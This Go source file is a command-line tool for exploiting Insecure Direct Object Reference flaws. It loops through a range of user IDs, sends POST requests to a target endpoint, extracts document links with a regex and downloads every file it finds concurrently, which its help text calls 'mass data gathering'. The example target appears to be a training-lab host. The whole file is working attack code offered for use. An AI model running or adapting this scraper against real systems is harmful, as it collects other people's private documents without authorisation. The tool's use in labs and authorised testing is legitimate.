package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
)

// Tool configurations
type Config struct {
	URL         string
	RangeStart  int
	RangeEnd    int
	Endpoint    string
	Regex       *regexp.Regexp
	Concurrency int
}

func showBanner() {
  fmt.Println(`
  .%%%%%%..%%%%%....%%%%...%%%%%......%%%%%%..%%..%%..%%..%%..%%...%%.
  ...%%....%%..%%..%%..%%..%%..%%.....%%......%%%.%%..%%..%%..%%%.%%%.
  ...%%....%%..%%..%%..%%..%%%%%......%%%%....%%.%%%..%%..%%..%%.%.%%.
  ...%%....%%..%%..%%..%%..%%..%%.....%%......%%..%%..%%..%%..%%...%%.
  .%%%%%%..%%%%%....%%%%...%%..%%.....%%%%%%..%%..%%...%%%%...%%...%%.
  ......................By: github.com/0xBl4nk........................

  `)
}

// Function to display the help
func showHelp() {
	helpText := `
	Usage: idor_enum_post -u URL -r RANGE -e ENDPOINT [options]

	Enumerates IDOR (Insecure Direct Object References) on a web server for mass data gathering.

	Mandatory options:
	-u URL         Base URL of the target server (e.g., http://SERVER_IP:PORT)
	-r RANGE       Range of IDs in the format START-END (e.g., 1-100)
	-e ENDPOINT    Endpoint with 'UID' as a placeholder (e.g., /documents.php?uid=UID)

	Optional options:
	-p REGEX       Regular expression to capture file links
  -c CONCURRENCY Number of simultaneous downloads
	-h, --help     Displays this help message

	Example of use:
	idor_enum_post -u http://83.136.251.168:53688 -r 1-20 -e "/documents.php?uid=UID" -p "/documents/.*\\V\.(txt|pdf)" -c 5
`
	fmt.Println(helpText)
}

func parseFlags() (*Config, error) {
	url := flag.String("u", "", "Base URL of the target server (e.g., http://SERVER_IP:PORT)")
	rangeFlag := flag.String("r", "", "Range of IDs in the format START-END (e.g., 1-100)")
	endpoint := flag.String("e", "", "Endpoint with 'UID' as a placeholder (e.g., /documents.php?uid=UID)")
	regexFlag := flag.String("p", "/documents/.*?\\.[a-zA-Z0-9]+", "Regular expression to capture file links (default: '/documents/.*?\\.[a-zA-Z0-9]+')")
	concurrency := flag.Int("c", 5, "Number of simultaneous downloads (default: 5)")
	help := flag.Bool("h", false, "Displays this help message")
	helpLong := flag.Bool("help", false, "Displays this help message")

	flag.Parse()

	if *help || *helpLong {
		showHelp()
		os.Exit(0)
	}

	// Validate mandatory parameters
	if *url == "" || *rangeFlag == "" || *endpoint == "" {
		return nil, fmt.Errorf("error: the parameters -u, -r, and -e are mandatory")
	}

	// Validate URL
	if !(strings.HasPrefix(*url, "http://") || strings.HasPrefix(*url, "https://")) {
		return nil, fmt.Errorf("error: invalid URL. It must start with http:// or https://")
	}

	// Validate Range
	rangeParts := strings.Split(*rangeFlag, "-")
	if len(rangeParts) != 2 {
		return nil, fmt.Errorf("error: invalid RANGE. It must be in the format START-END")
	}
	start, err := strconv.Atoi(rangeParts[0])
	if err != nil || start <= 0 {
		return nil, fmt.Errorf("error: START of RANGE must be a positive number")
	}
	end, err := strconv.Atoi(rangeParts[1])
	if err != nil || end <= 0 {
		return nil, fmt.Errorf("error: END of RANGE must be a positive number")
	}
	if start >= end {
		return nil, fmt.Errorf("error: START of RANGE must be less than END")
	}

	// Compile the regular expression
	regex, err := regexp.Compile(*regexFlag)
	if err != nil {
		return nil, fmt.Errorf("error: invalid regular expression: %v", err)
	}

	// Validate concurrency
	if *concurrency <= 0 {
		return nil, fmt.Errorf("error: CONCURRENCY must be a positive number")
	}

	config := &Config{
		URL:         strings.TrimRight(*url, "/"),
		RangeStart:  start,
		RangeEnd:    end,
		Endpoint:    *endpoint,
		Regex:       regex,
		Concurrency: *concurrency,
	}

	return config, nil
}

// Function to replace 'UID' in the endpoint
func replaceUID(endpoint string, uid int) string {
	return strings.ReplaceAll(endpoint, "UID", strconv.Itoa(uid))
}

// Function to extract links using regex
func extractLinks(body string, regex *regexp.Regexp) []string {
	matches := regex.FindAllString(body, -1)
	return matches
}

// Function to download a file
func downloadFile(url string, downloadDir string, client *http.Client, mutex *sync.Mutex) {
	// Create GET request
	resp, err := client.Get(url)
	if err != nil {
		mutex.Lock()
		fmt.Printf("Failed to download: %s | Error: %v\n", url, err)
		mutex.Unlock()
		return
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		mutex.Lock()
		fmt.Printf("Failed to download: %s | HTTP Status: %d\n", url, resp.StatusCode)
		mutex.Unlock()
		return
	}

	// Extract the filename
	parts := strings.Split(url, "/")
	filename := parts[len(parts)-1]
	filepath := filepath.Join(downloadDir, filename)

	// Create the file
	file, err := os.Create(filepath)
	if err != nil {
		mutex.Lock()
		fmt.Printf("Failed to create file: %s | Error: %v\n", filepath, err)
		mutex.Unlock()
		return
	}
	defer file.Close()

	// Write content to the file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		mutex.Lock()
		fmt.Printf("Failed to save file: %s | Error: %v\n", filepath, err)
		mutex.Unlock()
		return
	}

	// Inform success
	mutex.Lock()
	fmt.Printf("Downloaded: %s\n", url)
	mutex.Unlock()
}

func main() {
	showBanner()
  config, err := parseFlags()
	if err != nil {
		fmt.Println(err)
		showHelp()
		os.Exit(1)
	}

	// Create download directory if it doesn't exist
	downloadDir := "downloads"
	err = os.MkdirAll(downloadDir, os.ModePerm)
	if err != nil {
		fmt.Printf("Error creating download directory: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Starting ID enumeration and link extraction...")

	// Map to store unique links
	linksMap := make(map[string]struct{})
	var mapMutex sync.Mutex

	// HTTP client with timeout
	client := &http.Client{}

	// WaitGroup to wait for all ID requests
	var enumWG sync.WaitGroup

	// Mutex to prevent concurrent prints
	var mutex sync.Mutex

	// Iterate over the range of IDs
	for uid := config.RangeStart; uid <= config.RangeEnd; uid++ {
		enumWG.Add(1)
		go func(uid int) {
			defer enumWG.Done()
			fullEndpoint := replaceUID(config.Endpoint, uid)
			fullURL := config.URL + fullEndpoint

			// Create the POST request body
			formData := "uid=" + strconv.Itoa(uid)
			req, err := http.NewRequest("POST", fullURL, strings.NewReader(formData))
			if err != nil {
				mutex.Lock()
				fmt.Printf("UID %d: Error creating request: %v\n", uid, err)
				mutex.Unlock()
				return
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			// Perform HTTP POST request
			resp, err := client.Do(req)
			if err != nil {
				mutex.Lock()
				fmt.Printf("UID %d: Error accessing URL: %v\n", uid, err)
				mutex.Unlock()
				return
			}
			defer resp.Body.Close()

			// Check status code
			if resp.StatusCode != http.StatusOK {
				mutex.Lock()
				fmt.Printf("UID %d: HTTP %d\n", uid, resp.StatusCode)
				mutex.Unlock()
				return
			}

			// Read the response body
			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				mutex.Lock()
				fmt.Printf("UID %d: Error reading response: %v\n", uid, err)
				mutex.Unlock()
				return
			}
			body := string(bodyBytes)

			// Extract links using regex
			links := extractLinks(body, config.Regex)
			if len(links) == 0 {
				return
			}

			// Add links to the map in a thread-safe manner
			mapMutex.Lock()
			for _, link := range links {
				linksMap[link] = struct{}{}
			}
			mapMutex.Unlock()
		}(uid)
	}

	// Wait for all enumeration requests to complete
	enumWG.Wait()

	// Extract unique links
	var uniqueLinks []string
	for link := range linksMap {
		uniqueLinks = append(uniqueLinks, link)
	}

	// Check if any links were found
	if len(uniqueLinks) == 0 {
		fmt.Println("No links found.")
		os.Exit(0)
	}

	fmt.Println("Links successfully extracted. Starting downloads...")

	// Channel for downloads
	downloadChan := make(chan string, len(uniqueLinks))

	// Send links for download
	for _, link := range uniqueLinks {
		downloadChan <- link
	}
	close(downloadChan)

	// Limit concurrency using a semaphore
	semaphore := make(chan struct{}, config.Concurrency)

	// WaitGroup for downloads
	var wg sync.WaitGroup

	// Download files
	for link := range downloadChan {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(link string) {
			defer wg.Done()
			fullLink := config.URL + link
			downloadFile(fullLink, downloadDir, client, &mutex)
			<-semaphore
		}(link)
	}

	// Wait for all downloads to complete
	wg.Wait()

	fmt.Printf("Process completed. Downloaded files are in '%s/'.\n", downloadDir)
}
